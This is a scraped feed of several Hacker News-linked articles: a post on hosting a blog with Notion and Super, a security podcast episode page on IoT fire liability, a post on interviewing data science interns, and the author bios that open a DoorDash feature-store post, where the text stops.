<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-notion-super-blogging"><p><span><span><span>Nov 22, 2020</span></span><span> </span></span></p><p><span><span>My blog has now had 3 phases over</span><span><em> </em></span><span><strong><em>13 years </em></strong></span><span>(😱):</span></span></p><h2 id="block-2151df51dfc445268aff9b7df8fe6284"><span id="2151df51dfc445268aff9b7df8fe6284"></span><span><span>Wordpress (2007-2009)</span></span></h2><div id="block-edd40c18fd20479e8846a4462730ae86"><picture><source srcset="https://api.super.so/asset/quaran.to/02106789-446f-4eef-8750-21a8075e5f87.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/02106789-446f-4eef-8750-21a8075e5f87.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/02106789-446f-4eef-8750-21a8075e5f87.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/02106789-446f-4eef-8750-21a8075e5f87.png?w=1500" alt="Not sure what the stylesheet looked like, but it's long gone now." loading="lazy"></picture><figcaption><span><span>Not sure what the stylesheet looked like, but it's long gone now.</span></span></figcaption></div><h2 id="block-769ce70c084145d8b9c78e4e10c5eeee"><span id="769ce70c084145d8b9c78e4e10c5eeee"></span><span><span>Jekyll / GitHub Pages (2009-2020)</span></span></h2><div id="block-5ceedc994220402ba8bc7d88159726fd"><picture><source srcset="https://api.super.so/asset/quaran.to/3e66cb5c-a9ba-4284-95a5-3c106ebbcf74.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/3e66cb5c-a9ba-4284-95a5-3c106ebbcf74.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/3e66cb5c-a9ba-4284-95a5-3c106ebbcf74.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/3e66cb5c-a9ba-4284-95a5-3c106ebbcf74.png?w=1500" alt="I miss subtle patterns tiled backgrounds." loading="lazy"></picture><figcaption><span><span>I miss subtle patterns tiled backgrounds.</span></span></figcaption></div><h3 id="block-d2868af2e39d4fa7a4474c1d63027a3c"><span id="d2868af2e39d4fa7a4474c1d63027a3c"></span><span><span>Notion / Super (2020-?)</span></span></h3><div id="block-aacab40bc97c46679ae56efec394ec3b"><picture><source srcset="https://api.super.so/asset/quaran.to/2921f0b0-f782-4273-8699-7e853a4f5981.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/2921f0b0-f782-4273-8699-7e853a4f5981.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/2921f0b0-f782-4273-8699-7e853a4f5981.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/2921f0b0-f782-4273-8699-7e853a4f5981.png?w=1500" alt="Woof!" loading="lazy"></picture><figcaption><span><span>Woof!</span></span></figcaption></div><p><span><span>My writing tapered off immensely in recent years, and I didn't find </span><span><a href="https://github.com/qrush/qrush.github.com" target="_blank" rel="noopener noreferrer">my old site built with Jekyll</a></span><span> to be interesting to work on anymore. I've now swung back to the land of a managed platform that frees me from:</span></span></p><ul><li id="block-157db9bac7834326b77508840cb8c7db"><span><span>Worrying about Ruby dependency updates </span><span><span><span><em>(No JavaScript, what a concept!)</em></span></span></span></span></li><li id="block-ce9a3e9596cb4f8195e394a8baf10083"><span><span>An ancient CSS template that still uses 960.css </span><span><span><span><em>(and fully learning flexbox still, sorry I haven't done this yet)</em></span></span></span></span></li><li id="block-e8a503b4352841ffac0c4cf9e366a325"><span><span>Needing to think about mobile design / accessibility </span><span><span><span><em>(I hope Notion is doing so...)</em></span></span></span></span></li><li id="block-7a796ada75a14444951a3d656d64faf3"><span><span>Having to jump to GitHub (or my editor) to make changes. </span><span><span><span><em>(Now it's all in browser!)</em></span></span></span></span></li></ul><div id="block-6fceb34582d043c6bd40721cb0046f24"><p><span><span>I haven't switched my entire blog over, as most of my </span><span><span><a id="block-block-/cdca0dcdd3894bd6a33725aae7a87e20" href="https://quaran.to/cdca0dcdd3894bd6a33725aae7a87e20"></a></span></span></span></p><p><span> is hosted on other sites. Since the majority of the posts were on external sites I didn't feel beholden to correct URLs that may be broken, but I may do that too soon!</span></p></div><p><span><span>I've been using </span><span><a href="https://demo.super.so/" target="_blank" rel="noopener noreferrer">Super</a></span><span> to host my site off </span><span><a href="https://www.notion.so/" target="_blank" rel="noopener noreferrer">Notion</a></span><span>, which is only $4/month and allows me to stop worrying about all of the above. I get a great little writing and note-taking platform that allows for HTML import + export, and then Super scrapes all of that and wraps it up in a beautiful CDN-enabled package for any internet denizen to browse. </span></span></p><p><span><span>The Super setup is quite straightforward! Here's the basic steps once you sign up for Notion, and then sign up for Super:</span></span></p><h3 id="block-f4a63ce046bb43adb414346f87460def"><span id="f4a63ce046bb43adb414346f87460def"></span><span><span>Site Method</span></span></h3><p><span><span>Do you want suped-up pages for SEO or just publish your Notion document on the web? I've been using </span><span><strong>Super Static </strong></span><span>and it works quite wonderfully.</span></span></p><div id="block-378daa64ade44a8da70c8486a0d7d7a3"><picture><source srcset="https://api.super.so/asset/quaran.to/138a747c-0a3a-49f5-a047-4f444ad99222.png?w=432&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/138a747c-0a3a-49f5-a047-4f444ad99222.png?w=432" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/138a747c-0a3a-49f5-a047-4f444ad99222.png?w=432&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/138a747c-0a3a-49f5-a047-4f444ad99222.png?w=432" alt="image" loading="lazy"></picture></div><h3 id="block-5216e0858999452f8ee5c906f58f0f43"><span id="5216e0858999452f8ee5c906f58f0f43"></span><span><span>Site Settings</span></span></h3><p><span><span>The basics and the "root" of your site.</span></span></p><div id="block-9daaf9a7bef04348b742ea80bb79dbcf"><picture><source srcset="https://api.super.so/asset/quaran.to/f90cfade-4e16-4f9c-a718-3b61537e3e00.png?w=432&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/f90cfade-4e16-4f9c-a718-3b61537e3e00.png?w=432" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/f90cfade-4e16-4f9c-a718-3b61537e3e00.png?w=432&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/f90cfade-4e16-4f9c-a718-3b61537e3e00.png?w=432" alt="image" loading="lazy"></picture></div><h3 id="block-f9c8c75974d947a493bfd0fe65354a94"><span id="f9c8c75974d947a493bfd0fe65354a94"></span><span><span>Pretty URLs</span></span></h3><p><span><span>This section needs some work. It would be nice to use Notion itself for this via a "database" page, or use tags on pages to create their pretty URLs. This is a bit annoying to make for every post, and I hope this gets fixed soon. If I was moving over a blog with 100s of entries this would be a nonstarter, or I'd have to choose a new domain. For now, I punted on the old posts.</span></span></p><div id="block-1ab7f0cd79994ccdb3a348a35cefd016"><picture><source srcset="https://api.super.so/asset/quaran.to/b257bac1-11b0-44ee-bd3f-20e2787bcd8e.png?w=432&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/b257bac1-11b0-44ee-bd3f-20e2787bcd8e.png?w=432" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/b257bac1-11b0-44ee-bd3f-20e2787bcd8e.png?w=432&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/b257bac1-11b0-44ee-bd3f-20e2787bcd8e.png?w=432" alt="image" loading="lazy"></picture></div><h3 id="block-f824fd57c96a4e0997bf1d96f971c00c"><span id="f824fd57c96a4e0997bf1d96f971c00c"></span><span><span>DNS Records</span></span></h3><p><span><span>There's nice walkthroughs for the "big" DNS providers, but setting this up with </span><span><a href="https://dnsimple.com/r/35d1afbfe92d46" target="_blank" rel="noopener noreferrer">DNSimple</a></span><span> was pretty easy to do.</span></span></p><div id="block-1c2b641343b948fc9de5a251d071f964"><picture><source srcset="https://api.super.so/asset/quaran.to/cd971f81-f3af-4e67-8f69-964553749454.png?w=432&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/cd971f81-f3af-4e67-8f69-964553749454.png?w=432" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/cd971f81-f3af-4e67-8f69-964553749454.png?w=432&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/cd971f81-f3af-4e67-8f69-964553749454.png?w=432" alt="image" loading="lazy"></picture></div><h3 id="block-1992c6d4c62e40b4a7f605e67e00bfaf"><span id="1992c6d4c62e40b4a7f605e67e00bfaf"></span><span><span>Super Options</span></span></h3><p><span><span>I've decided to not track visits/readership via analytics for now but it's nice that there's an option. I'd rather have readers engage me </span><span><a href="https://twitter.com/qrush" target="_blank" rel="noopener noreferrer">via Twitter</a></span><span> instead of a comments feed anyhow, and I'm not sure what I would learn from analytics on my blog other than it gets less traffic than I'd like.</span></span></p><div id="block-f65868bd015e42f084c8c905177c381d"><picture><source srcset="https://api.super.so/asset/quaran.to/b5e3e1c3-40d0-464f-a684-66797e0c0f55.png?w=432&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/quaran.to/b5e3e1c3-40d0-464f-a684-66797e0c0f55.png?w=432" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/quaran.to/b5e3e1c3-40d0-464f-a684-66797e0c0f55.png?w=432&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/quaran.to/b5e3e1c3-40d0-464f-a684-66797e0c0f55.png?w=432" alt="image" loading="lazy"></picture></div><h2 id="block-fd8b6bebb3634ae994ca02dde02aa0fe"><span id="fd8b6bebb3634ae994ca02dde02aa0fe"></span><span><span>The end game</span></span></h2><p><span><span>So one might think: what happens when Super, or Notion, breaks this setup or disallows publishing? Yes, that's a risk I have assumed with this project. I can export any Notion document as HTML or Markdown, so once this setup stops working I'll just move on, just like I did twice before. This time it'll cost $4/mo for the time being, but honestly that's motivation to get me to write more. I guess we'll see in a few years!</span></span></p><p><span><span>The TL;DR:</span></span></p><blockquote id="block-f202c639bec24c5c8ac7f2352f767bc8"><span><span>1. Sign up for both Notion + Super
2. Configure DNS
3. Don't stop writing</span></span></blockquote><p><span><span><em>If you enjoyed this, you can use my referral link to sign up for Super and that'd just lovely:</em></span></span></p></article></div></div></div>]]>
            </description>
            <link>https://quaran.to/notion-super-blogging</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182992</guid>
            <pubDate>Mon, 23 Nov 2020 02:19:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OSS Security podcast 225 – Who is responsible if IoT burns down your house?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182934">thread link</a>) | @pabs3
<br/>
November 22, 2020 | https://opensourcesecurity.io/2020/11/22/episode-225-who-is-responsible-if-iot-burns-down-your-house/ | <a href="https://web.archive.org/web/*/https://opensourcesecurity.io/2020/11/22/episode-225-who-is-responsible-if-iot-burns-down-your-house/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-2077">

	<header>
						<div>
			<p><span><span>Posted by</span><span><a href="https://opensourcesecurity.io/author/josh574317670/">Josh Bressers</a></span></span><span><a href="https://opensourcesecurity.io/2020/11/22/episode-225-who-is-responsible-if-iot-burns-down-your-house/" rel="bookmark"><time datetime="2020-11-22T18:01:00-06:00">November 22, 2020</time><time datetime="2020-11-22T17:21:14-06:00">November 22, 2020</time></a></span><span><span>Posted in</span><a href="https://opensourcesecurity.io/category/podcast/" rel="category tag">Podcast</a>, <a href="https://opensourcesecurity.io/category/security/" rel="category tag">Security</a></span><span><span>Tags:</span><a href="https://opensourcesecurity.io/tag/battery/" rel="tag">battery</a>, <a href="https://opensourcesecurity.io/tag/burners-lee/" rel="tag">burners-lee</a>, <a href="https://opensourcesecurity.io/tag/dorbell/" rel="tag">dorbell</a>, <a href="https://opensourcesecurity.io/tag/fire/" rel="tag">fire</a>, <a href="https://opensourcesecurity.io/tag/iot/" rel="tag">IoT</a>, <a href="https://opensourcesecurity.io/tag/liability/" rel="tag">liability</a>, <a href="https://opensourcesecurity.io/tag/privacy/" rel="tag">privacy</a>, <a href="https://opensourcesecurity.io/tag/ring/" rel="tag">ring</a></span>		</p></div><!-- .meta-info -->
			</header>

	
			<figure>
				<img width="1568" height="882" src="https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=1568" alt="matches" loading="lazy" srcset="https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=1568 1568w, https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=150 150w, https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=300 300w, https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=768 768w, https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=1024 1024w, https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg 1920w" sizes="(max-width: 1568px) 100vw, 1568px" data-attachment-id="2078" data-permalink="https://opensourcesecurity.io/2020/11/22/episode-225-who-is-responsible-if-iot-burns-down-your-house/fire-2086388_1920/" data-orig-file="https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg" data-orig-size="1920,1080" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fire-2086388_1920" data-image-description="" data-medium-file="https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=300" data-large-file="https://opensourcesecurityio.files.wordpress.com/2020/11/fire-2086388_1920-e1606087000858.jpg?w=750">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p><a href="https://twitter.com/joshbressers">Josh</a> and <a href="https://twitter.com/kurtseifried">Kurt</a> talk about the safety and liability of new devices. What happens when your doorbell can burn down your house? What if it’s your fault the doorbell burned down your house? There isn’t really any prior art for where our devices are taking us, who knows what the future will look like.</p>



<!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
<p><audio id="audio-2077-1" preload="none" controls="controls"><source type="audio/mpeg" src="https://traffic.libsyn.com/secure/opensourcesecuritypodcast/Episode_225_Who_is_responsible_if_IoT_burns_down_your_house.mp3?_=1"><a href="https://traffic.libsyn.com/secure/opensourcesecuritypodcast/Episode_225_Who_is_responsible_if_IoT_burns_down_your_house.mp3">https://traffic.libsyn.com/secure/opensourcesecuritypodcast/Episode_225_Who_is_responsible_if_IoT_burns_down_your_house.mp3</a></audio></p><h2><strong>Show Notes</strong></h2>



<ul><li><a href="https://www.cpsc.gov/Recalls/2020/ring-recalls-video-doorbells-2nd-generation-due-to-fire-hazard#">Ring Doorbell recall</a></li><li><a href="https://support.ring.com/hc/en-us/articles/360050949611-Ring-Video-Doorbell-2nd-Generation-Recall">Ring incorrect screw diagram</a></li><li><a href="https://www.youtube.com/watch?v=zHG_FEkZUsg">Punctured battery</a></li><li><a href="https://opensourcesecurity.io/2019/05/13/episode-145-what-do-security-and-fire-have-in-common/">Episode 145 – What do security and fire have in common?</a></li><li><a href="https://www.youtube.com/watch?v=R-mDqKtivuI">Phillips vs Robertson screws</a></li><li><a href="https://twitter.com/wendyck">wendy knox everette</a></li><li><a href="https://www2.slideshare.net/WendyKnoxEverette/security-vulnerabilities-the-current-state-of-consumer-protection-law-how-iot-might-change-it">Wendy’s presentation on legal liability</a></li><li><a href="https://www.cnet.com/news/tim-berners-lee-startup-launches-privacy-focused-service-to-secure-your-data/">Tim Burners-Lee privacy company</a></li></ul>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		<div><div><p><a href="https://opensourcesecurity.io/2020/11/19/we-cant-move-forward-by-looking-back/" rel="prev"> <span>Previous post:</span> <br><span>We can’t move forward by looking&nbsp;back</span></a></p></div></div>
	</nav>
		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://opensourcesecurity.io/2020/11/22/episode-225-who-is-responsible-if-iot-burns-down-your-house/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182934</guid>
            <pubDate>Mon, 23 Nov 2020 02:10:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Human Friendly Data Science Interviews]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182809">thread link</a>) | @juliov
<br/>
November 22, 2020 | https://jvblog.net/human-friendly-data-science-interviews/ | <a href="https://web.archive.org/web/*/https://jvblog.net/human-friendly-data-science-interviews/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><p>22 Nov 2020<br>22 Nov 2020</p><p><em>TL;DR. We focused on a holistic view of our candidates (technical and interpersonal skills) while trying to be fair with everyone’s time and life experiences. We could identify the outstanding people and those that weren’t a good fit and have had a great experience working with our hires!</em></p><p>After reading <a href="https://www.neilwithdata.com/developer-hiring">The software industry’s greatest sin: hiring</a> by Neil Sainsbury and <a href="https://andrewrondeau.com/blog/2020/04/take-home-vs-whiteboard-coding-the-problem-is-bad-interviews">Take-home vs. whiteboard coding: The problem is bad interviews</a> by Andrew Rondeau, several critical points about interviewing software developers stood out to me:</p><ul><li>Software developers are usually assessed based on technical aspects ignoring their personal and organizational qualities. This might produce technically correct software with good performance, but that might be far from fulfilling users’ needs.</li><li>Someone can be technically excellent but lack the skills to understand and interact with your users and the rest of the team.</li><li>Someone can be technically excellent but keep using technologies they find interesting but are not aligned with the company’s goals.</li><li>There are tradeoffs between whiteboard and take-home questions: time invested by both parties, different development environment/conditions, visibility of the candidate’s technical and personal qualities, and the feedback loop between the examiner and the applicant.</li><li>A key aspect is to plan a good interview with coding assignments that consider the company’s needs and are fair for everyone involved.</li><li>Presenting existing code is briefly discussed by Andrew Rondeau as an alternative to whiteboard and take-home questions.</li></ul><p>I am a postdoctoral researcher at a group that explores mobile data’s role in monitoring or supporting people with different health conditions. Broadly speaking, we collect smartphone and wearable sensor data, process it, and use it to create statistical and machine learning models that provide relevant behavioral or clinical insights. This is possible thanks to our team’s multi-disciplinary nature with expertise in psychology, statistics, computer science, software engineering, and data science.</p><p>Recently, we needed to hire a couple of data science interns from the local master’s program, and I was in charge of leading the technical part of the interviews. This was an excellent opportunity for me to pilot the type of technical interview that I’d like to experience based on the points I summarized above and the lab’s needs.</p><p>I divided our interviews into two 30-minute stages, one to talk about one of the candidate’s past projects and the other to find out how they would approach a data science problem that represents the kind of work we do.</p><p>For the first stage, we asked applicants to submit in advance a past data science project that they would like to discuss with us. I want to clarify that we accepted any industry, school, or hobby code repository and did not judge its purpose or complexity. We don’t expect that everyone will have the time to work on side-projects in their free time or disclose code from a previous employer. However, their sample project allowed us to understand some of the person’s experience with data science and software engineering practices like data cleaning, modeling, documentation, version control, variable and function naming, code comments, code formatting, and code refactoring. If any of these aspects were missing or seemed unsatisfactory, we made a note and ask about them during the interview.</p><p>When the time came for the first part of our face-to-face chat (where we talked about their chosen project), we focused on their hard skills (technical expertise, domain knowledge, and problem-solving abilities), soft skills (communication, multi-disciplinary collaboration, feedback reception), and traits like proactiveness, enthusiasm, motivation, clarity of thought, independence and attention to detail. This is our take on what Neil refers to as a candidate’s “holistic” view. Crucially, having technical and non-technical members from our team present made it easier to discuss and evaluate our candidates. More specifically, we inquired people about their role in previous teams (if any), their approach to learning, and their thought process to choose the best tool for the job. We also prompted them to explain complex non-technical concepts to everyone in the interview panel and to talk more about their experience interacting with past “clients” (teachers, fellow students, or any other stakeholders for those with experience in Industry). One of the advantages of this setup was that it allowed everyone to interact in a work environment very similar to what we experience every day while planning, implementing, executing, analyzing, and publishing a health intervention or monitoring study.</p><p>In the second part of the interview, we asked participants the following question: how would you implement a sleep classifier based on smartphone and Fitbit data? Even if this problem appears simple at first sight, numerous decisions and considerations can be taken into account along the way. For example, we can talk about missing data, feature engineering, data resampling, data imputation, class imbalance, type of model (population or individual), hyper-parameter tuning, model choice, baselines, cross-validation, evaluation metrics, etc. Consequently and to foster the discussion, we always dropped clues, clarifications, and follow up questions.</p><p>We did not expect our interviewees to reach a comprehensive solution or write any code (it took us weeks to finish a publishable solution, and the first part of the interview already would have given us an idea of their programming skills). Instead, we wanted to know more about their thinking process. We paid particular attention to the candidate’s understanding of the problem (do they ask relevant questions?), creativity (how do they suggest tackling this problem?), experience (are they levering solutions to past problems?), technical expertise (what programming language, libraries, or methods would they like to use?), and communication skills (can they engage the whole team in the discussion?).</p><p>This process fits well within our workflow and our team’s characteristics, and we hope that by sharing it, you can adapt it to your needs and provide a better experience for your candidates.</p></div></div>]]>
            </description>
            <link>https://jvblog.net/human-friendly-data-science-interviews/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182809</guid>
            <pubDate>Mon, 23 Nov 2020 01:42:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a scalable Machine Learning feature store for DoorDash]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25182692">thread link</a>) | @maxpert
<br/>
November 22, 2020 | https://doordash.engineering/2020/11/19/building-a-gigascale-ml-feature-store-with-redis/ | <a href="https://web.archive.org/web/*/https://doordash.engineering/2020/11/19/building-a-gigascale-ml-feature-store-with-redis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>
										<div id="author86">
						<div>
							<p><img width="96" height="96" src="https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?fit=96%2C96&amp;ssl=1" alt="" loading="lazy" srcset="https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?w=512&amp;ssl=1 512w, https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?resize=300%2C300&amp;ssl=1 300w, https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?resize=150%2C150&amp;ssl=1 150w, https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?resize=70%2C70&amp;ssl=1 70w, https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?resize=24%2C24&amp;ssl=1 24w, https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?resize=48%2C48&amp;ssl=1 48w, https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?resize=96%2C96&amp;ssl=1 96w" sizes="(max-width: 96px) 100vw, 96px" data-attachment-id="1822" data-permalink="https://doordash.engineering/screen-shot-2020-07-17-at-6-09-31-pm/" data-orig-file="https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?fit=512%2C512&amp;ssl=1" data-orig-size="512,512" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Arbaz Khan" data-image-description="" data-medium-file="https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?fit=300%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/doordash.engineering/wp-content/uploads/2020/07/Screen-Shot-2020-07-17-at-6.09.31-PM.png?fit=512%2C512&amp;ssl=1"></p>
							<div>
								<h4>Arbaz Khan</h4><p>Arbaz Khan is a ML Platform engineer at DoorDash with a background in building end-to-end ML systems. Arbaz attended Indian Institute of Technology Kanpur (IITK) where he did his Bachelors and Masters in Computer Science.</p>
							</div>
													</div>
					</div>
					
										<div id="author29">
						<div>
							<p><img width="96" height="96" src="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=96%2C96&amp;ssl=1" alt="" loading="lazy" srcset="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?w=506&amp;ssl=1 506w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=296%2C300&amp;ssl=1 296w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=150%2C150&amp;ssl=1 150w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=70%2C70&amp;ssl=1 70w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=24%2C24&amp;ssl=1 24w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=48%2C48&amp;ssl=1 48w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=96%2C96&amp;ssl=1 96w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=300%2C300&amp;ssl=1 300w" sizes="(max-width: 96px) 100vw, 96px" data-attachment-id="2547" data-permalink="https://doordash.engineering/screen-shot-2020-09-25-at-7-21-00-pm/" data-orig-file="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=506%2C512&amp;ssl=1" data-orig-size="506,512" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Zohaib Sibte Hassan" data-image-description="" data-medium-file="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=296%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=506%2C512&amp;ssl=1"></p>
							<div>
								<h4>Zohaib Sibte Hassan</h4><p>Zohaib is the engineering lead on the Platform Engineering team, focused on craftsmanship, performance, intelligent systems, hacking, and system architecture.</p>
							</div>
													</div>
					</div>
					<a href="#" data-href="author29">
						<img width="96" height="96" src="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=96%2C96&amp;ssl=1" alt="" loading="lazy" srcset="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?w=506&amp;ssl=1 506w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=296%2C300&amp;ssl=1 296w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=150%2C150&amp;ssl=1 150w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=70%2C70&amp;ssl=1 70w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=24%2C24&amp;ssl=1 24w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=48%2C48&amp;ssl=1 48w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=96%2C96&amp;ssl=1 96w, https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?resize=300%2C300&amp;ssl=1 300w" sizes="(max-width: 96px) 100vw, 96px" data-attachment-id="2547" 